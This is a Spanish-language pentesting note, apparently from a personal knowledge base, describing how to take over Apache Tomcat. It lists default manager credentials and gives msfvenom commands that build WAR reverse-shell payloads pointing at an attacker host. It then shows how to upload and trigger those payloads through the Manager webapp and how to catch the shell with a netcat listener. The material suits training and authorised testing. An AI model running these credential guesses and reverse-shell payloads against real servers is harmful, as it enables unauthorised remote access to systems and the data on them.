Apache Tomcat es un servidor de aplicaciones web de código abierto desarrollado por la Fundación Apache. Está diseñado para ejecutar aplicaciones web basadas en Java y sirve como contenedor de servlets y motor de páginas JSP (JavaServer Pages).

puerto  por defecto: 8080
web por defecto:

![[Tomcat - Web por defecto de Tomcat.png]]


Tenemos que entrar en: Manager webapp
y nos pide credenciales
usuario:Contraseña


si le damos a cancelar nos puede enseñar la siguiente página: donde nos da el usuario y la contraseña de acceso el propio tomcat

![[Tomcat - pagina cancel default credentials.png]]

las credenciales por defecto las encontramos en la web: https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat
- admin:admin
- mcat:tomcat
- admin:
- admin:s3cr3t
- tomcat:s3cr3t
- admin:tomcat
Pagina por defecto del manager de tomcat:
![[Tomcat - Web por defecto manager de Tomcat.png]]



 Una vez en esta web buscamos el aparatado WAR file to deploy:
 ![[Tomcat - WAR file to deploy.png]]

Vamos a subir un fichero con un payload creado con msfvenom[[MSFVENOM]]
Para ello el payload será:
```sh fold:"msfvenom payload tomcat raw file default reverse 1"
msfvenom -p java/shell_reverse_tcp LHOST={IP_atacante} LPORT={Puerto_escucha} -f war -o reverse1.war
```


```sh fold:"msfvenom payload tomcat raw file default reverse 2"
msfvenom -p java/jsp_shell_reverse_tcp LHOST={IP_atacante} LPORT={Puerto_escucha} -f war -o reverse2.war
```

Payload reverse war:

![[Tomcat - payloads generate.png]]

Subimos nuestros ficheros creados al servidcdor de tomcat y nso aparecen de la siguiente forma:
![[Tomcat - Files uploaded.png]]

Ahora solo nos falta ponernos a la escucha por el puerto que hemos seleccionado a la hora de crear el payload 

```sh fold:"Ponerse a la escucha con netcat en el puerto 443"
nc -nlvp 443
```

y ejecutamos el fichero desde el manager y deberíamos de recibir la conexión:
![[Tomcat - Conexion.png]]


Ahora faltaría un tratamiento de la TTY [[Tratamiento de la TTY]]